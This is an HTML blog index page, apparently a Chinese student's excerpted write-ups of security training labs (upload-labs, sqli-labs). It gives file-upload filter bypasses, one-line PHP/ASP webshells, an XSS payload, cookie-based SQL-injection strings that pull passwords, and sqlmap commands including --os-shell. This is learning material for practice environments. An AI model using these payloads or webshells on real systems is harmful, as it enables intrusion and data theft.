+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h1hpfgdcaej30rh0hyjtz.jpg" alt="img"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/13/upload-labs/">upload-labs</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-21</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="upload-1"   >
+          <a href="#upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-1" class="headerlink" title="upload -1"></a>upload -1</h1>
+      <p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h17xedfd8qj30uj0e6aam.jpg" alt="img"></p>
+<p>弹窗现实不允许上传，说明这个的限制是出现在前端。禁用浏览器的JavaScript即可</p>
+
+        <h1 id="upload-2"   >
+          <a href="#upload-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-2" class="headerlink" title="upload-2"></a>upload-2</h1>
+      <p>先看提示：MIME检查</p>
+<p>那么我们直接文件改名为shell.png</p>
+<p>上传抓包，把框中文件名改为：shell.php</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h17xmnlrxoj30nc0g0q4q.jpg" alt="img"></p>
+<p>使用蚁剑进行连接即可</p>
+
+        <h1 id="upload-3"   >
+          <a href="#upload-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-3" class="headerlink" title="upload-3"></a>upload-3</h1>
+      <p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>
+<p>此题是利用黑名单进行过滤，只要使用这些禁止的之外就行。例如有phtml，php3，pht，phps</p>
+
+        <h1 id="upload-4"   >
+          <a href="#upload-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-4" class="headerlink" title="upload-4"></a>upload-4</h1>
+      <p>这题相对来说，步骤多一些。他禁止了一堆后缀名。</p>
+<p>我们可以通过上传一个.htaccess配置文件， SetHandler application&#x2F;x-httpd-php 这句话的意思是：把所有文件都看着php来用</p>
+<p>并抓包。抓包后，必须将.前面的全部删除，才能用</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h1800ypx2ej30my0glac3.jpg" alt="img"></p>
+<p>之后上传png格式的shell文件就行了</p>
+
+        <h1 id="upload-5"   >
+          <a href="#upload-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-5" class="headerlink" title="upload-5"></a>upload-5</h1>
+      <p>我们直接研究一下源代码，在源代码中没有把文件名转化为小写这行代码。所以我们只要通过大小写就可以绕过他的检验</p>
+<p>上传shell.Php即可</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h18051uap6j30jw0go3zk.jpg" alt="img"></p>
+
+        <h1 id="upload-6"   >
+          <a href="#upload-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-6" class="headerlink" title="upload-6"></a>upload-6</h1>
+      <p>通过观看源代码发现，没有去除空格。所以我们通过上传时抓包，在文件名后面加上一个空格，即可绕过，</p>
+<p>但是由于靶场不是windows系统，所以没有作用。</p>
+<p>按道理，如果是windows系统，最后的空格系统会自动去掉。但这个靶场的环境不行</p>
+<p>在windows靶场中，成功</p>
+
+        <h1 id="upload-7"   >
+          <a href="#upload-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-7" class="headerlink" title="upload-7"></a>upload-7</h1>
+      <p>抓包，把文件名改为shell.php.即可</p>
+
+        <h1 id="upload-8"   >
+          <a href="#upload-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-8" class="headerlink" title="upload-8"></a>upload-8</h1>
+      <p>在源代码中没用过滤::$data。这个东西在windows系统里会直接过滤掉。</p>
+<p>所以我们抓包，在.php后面添加::$data即可。还是需要windows环境，这个靶场不行</p>
+
+        <h1 id="upload-9"   >
+          <a href="#upload-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-9" class="headerlink" title="upload-9"></a>upload-9</h1>
+      <p>可抓包后在文件末尾加上. .因为他只去除了一个.一个空格。</p>
+
+        <h1 id="upload-10"   >
+          <a href="#upload-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-10" class="headerlink" title="upload-10"></a>upload-10</h1>
+      <p>根据源码分析，是把黑名单里面的替换成空。</p>
+<p>那么我们只需要双写即可。蚁剑轻松连接</p>
+
+        <h1 id="upload-11"   >
+          <a href="#upload-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-11" class="headerlink" title="upload-11"></a>upload-11</h1>
+      <p>这个根据提示是位置可控。</p>
+<p>我们只需要把要上传的shell后缀改为白名单中的一种，然后上传时抓包。把位置改为&#x2F;upload&#x2F;shell.php%00即可</p>
+<p>但是这个%00截断只能在php5.3以下才有用，所以这个靶场不支持</p>
+
+        <h1 id="upload-12"   >
+          <a href="#upload-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-12" class="headerlink" title="upload-12"></a>upload-12</h1>
+      <p>和上题几乎相同，区别在于传递方式不一样。我们只需要右击%00然后进行url编码即可，或者之前去改16进制也行</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h186sq7my7j30p60gv0vh.jpg" alt="img"></p>
+
+        <h1 id="upload-13、14、15"   >
+          <a href="#upload-13、14、15" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-13、14、15" class="headerlink" title="upload-13、14、15"></a>upload-13、14、15</h1>
+      <p>我们可以先使用copy shell.png  &#x2F;b +shell.php &#x2F;a webshell.png 生成一个图片马，也可以抓包然后把shell写进去</p>
+<p>把图片马上传，然后利用文件包含漏洞访问&#x2F;include.php?file&#x3D;upload&#x2F;9320220413085029.gif</p>
+<p>之后用蚁剑连接这个文件包含的连接即可</p>
+
+        <h1 id="upload-16"   >
+          <a href="#upload-16" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-16" class="headerlink" title="upload-16"></a>upload-16</h1>
+      
+        <h1 id="upload-17、18"   >
+          <a href="#upload-17、18" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-17、18" class="headerlink" title="upload-17、18"></a>upload-17、18</h1>
+      <p>两个都是上传之后不段的访问。十七题视频<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://v.douyin.com/FJyxQf2/" >https://v.douyin.com/FJyxQf2/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="upload-19"   >
+          <a href="#upload-19" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-19" class="headerlink" title="upload-19"></a>upload-19</h1>
+      <p>通过看代码发现，这题使用的是黑名单，然后还没有变全小写。那么我们直接把保存的名称后缀用大写就好了</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-11</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-11</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a</p>
+<p>webshell分类：</p>
+<p>​    一句话木马：代码量小，需要和webshell管理工具配合使用；</p>
+<p>​                php：<?php @eval($_POST[_])?>  &lt;?php @assert($_POST[_];?)&gt;</p>
+<p>@屏蔽错误</p>
+<p>eval() php函数，解析字符串类型的php代码</p>
+<p>$</p>
+<p>​                asp:&lt;%eval request(“k”)%&gt;</p>
+<p>aspx:</p>
+<p>jsp:</p>
+<p>小马：功能单一（文件上传、命令执行等），通常和大马结合使用</p>
+<p>大妈：功能较多，代码量大，隐蔽性查，常见功能有文件管理、虚拟终端、数据库管理、提权、信息收集等</p>
+<p>内存马：扩展（php+。.net+java+python等）</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/10/SQLI-DUMB-SERIES-22/">SQLI-DUMB-SERIES-22</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-10</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>a</p>
+<p>和上一题一样，区别就是闭合方式不同。这个是”</p>
+<p><img src="C:\Users\88537\AppData\Roaming\Typora\typora-user-images\image-20220410190622779.png" alt="image-20220410190622779"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/10/SQLI-DUMB-SERIES-21/">SQLI-DUMB-SERIES-21</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-10</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>s首先我们看到提示，这个是与base64有关的注入</p>
+<p>我们直接抓包</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h14t0twofyj30cf0c5ab6.jpg" alt="img"></p>
+<p>我们在这里可以看到cooike里面，是经过加密的。（好吧，就是看着猜，其实每种加密方式都会有自己的特点，了解后比较容易区分）</p>
+<p>咱很明显知道了，咱的uname应该是admin，而它是YMRtaW4%3D。因为我们猜测是base64加密，所以我们对它进行处理。但发现我们得出的加密结果与它给的还不一样，一个是&#x3D;一个是%3D，其实这两个是一个玩意，</p>
+<p>然后我们把admin’加密之后替换掉那个原生uname。发现报错了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h14tjqpaxbj30xm0f0gpt.jpg" alt="img"></p>
+<p>那么接下来就很简单了，我们只需要把之前经常用的注入语句用base64编码输进去就行了</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/04/%E6%AF%94%E8%BE%83%E9%95%BF%E7%9A%84sql%E8%AF%AD%E5%8F%A5/">比较长的sql语句</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-05</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>当用时间盲注时可用</p>
+<p>(select 123 from(select (sleep (5)))a)来替换sleep（5）                 </p>
+<p>密码的特殊需求     相同                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </p>
+<p>1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;<strong>&#x2F;replace(replace(‘1”&#x2F;</strong>&#x2F;union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;replace(replace(“.”,char(34),char(39)),char(46),”.”)#’,char(34),char(39)),char(46),’1”&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select&#x2F;**&#x2F;replace(replace(“.”,char(34),char(39)),char(46),”.”)#’)# </p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/sqlmap%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/">sqlmap相关操作</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="1-基础"   >
+          <a href="#1-基础" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-基础" class="headerlink" title="1.基础"></a>1.基础</h1>
+      
+        <h2 id="检测是否存在注入点"   >
+          <a href="#检测是否存在注入点" class="heading-link"><i class="fas fa-link"></i></a><a href="#检测是否存在注入点" class="headerlink" title="检测是否存在注入点"></a>检测是否存在注入点</h2>
+      <p>sql -u “网页地址” </p>
+
+        <h2 id="查看所有数据库"   >
+          <a href="#查看所有数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h2>
+      <p>sql -u “网页地址”  –dbs</p>
+
+        <h2 id="查看当前数据库"   >
+          <a href="#查看当前数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看当前数据库" class="headerlink" title="查看当前数据库"></a>查看当前数据库</h2>
+      <p>sql -u “网页地址”  –current-db</p>
+
+        <h2 id="查看表名"   >
+          <a href="#查看表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h2>
+      <p>sql -u “网页地址”  -D 数据库名 –tables</p>
+
+        <h2 id="查字段名"   >
+          <a href="#查字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#查字段名" class="headerlink" title="查字段名"></a>查字段名</h2>
+      <p>sql -u “网页地址” -D 数据库名 -T 表名 –columns</p>
+
+        <h1 id="2-进阶"   >
+          <a href="#2-进阶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-进阶" class="headerlink" title="2.进阶"></a>2.进阶</h1>
+      
+        <h2 id="输出级别参数"   >
+          <a href="#输出级别参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#输出级别参数" class="headerlink" title="输出级别参数"></a>输出级别参数</h2>
+      <p>sqlmap -u “地址” -v 级别</p>
+
+        <h3 id="级别：默认输出为1"   >
+          <a href="#级别：默认输出为1" class="heading-link"><i class="fas fa-link"></i></a><a href="#级别：默认输出为1" class="headerlink" title="级别：默认输出为1"></a>级别：默认输出为1</h3>
+      <p>0：只显示python的回溯、错误和关键信息</p>
+<p>1：显示信息和警告消息（默认）</p>
+<p>2：显示调试信息</p>
+<p>3：显示注入使用的攻击载荷（常用）</p>
+<p>4：显示HTTP请求</p>
+<p>5：显示HTTP响应头</p>
+<p>6：显示HTTP相应页面的内容</p>
+
+        <h2 id="测试注入点权限"   >
+          <a href="#测试注入点权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#测试注入点权限" class="headerlink" title="测试注入点权限"></a>测试注入点权限</h2>
+      <p>sqlmap -u “网页地址” –privileges -U 用户名 (-U后面不写，则是查看所有用户的权限)</p>
+
+        <h2 id="执行shell命令"   >
+          <a href="#执行shell命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h2>
+      <p>sqlmap -u “网页地址” –os-cmd&#x3D;”net user” 执行net user语句</p>
+<p>sqlmap -u “网页地址” –os-shell 使用系统交互式的shell</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/30/SQLI-DUMB-SERIES-20/">SQLI-DUMB-SERIES-20</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-31</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0t1tj9scbj31070f7n0c.jpg" alt="img"></p>
+<p>提示过于明显，直接去和cookie battle一下</p>
+<p>抓包，我i们得找他的GET包，因为他的post包还没生成cookie呢。</p>
+<p>加单引号，发现可以还是挺良心得</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0t1xueuvjj30oy0eoadt.jpg" alt="img"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,database()),0x3a) %23</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0t2d1sbdaj30oh0hx42b.jpg" alt="img"></p>
+<p>后续步骤仍是枯燥无味得重复</p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select table_name from information_schema.tables where table_schema&#x3D;database()limit 3,1)),0x3a) %23</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t2fqruq1j30oq0io0x8.jpg" alt="img"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select column_name from information_schema.columns where table_name&#x3D;’users’limit 2,1)),0x3a) %23</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0t2hg5wpdj30ob0jpjvu.jpg" alt="img"></p>
+<p>Cookie: uname&#x3D;admin’ and updatexml(0x3e,concat(0x3a,(select password from users where id&#x3D;’8’)),0x3a) %23</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0t2ik8lhqj30o80h9gpe.jpg" alt="img"></p>
+<p>密码又一次跑了出来(⓿_⓿)</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
